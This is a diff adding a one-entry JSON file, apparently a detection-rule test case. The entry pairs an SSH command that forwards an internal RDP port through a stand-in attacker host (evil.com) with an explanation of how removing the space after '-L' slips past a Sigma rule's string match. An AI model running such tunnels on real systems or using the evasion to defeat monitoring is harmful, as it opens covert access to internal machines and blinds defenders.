@@ -1,0 +1,6 @@
+[
+  {
+    "output": "ssh.exe -L8888:192.168.1.10:3389 user@evil.com",
+    "explanation": "The Sigma rule relies on exact string matching with spaces for the tunneling flags (e.g., ' -L ', ' -R '). SSH clients often accept arguments without a trailing space. By removing the space between the '-L' switch and the port configuration, the 'selection_opt' condition fails to match, successfully bypassing the rule."
+  }
+]
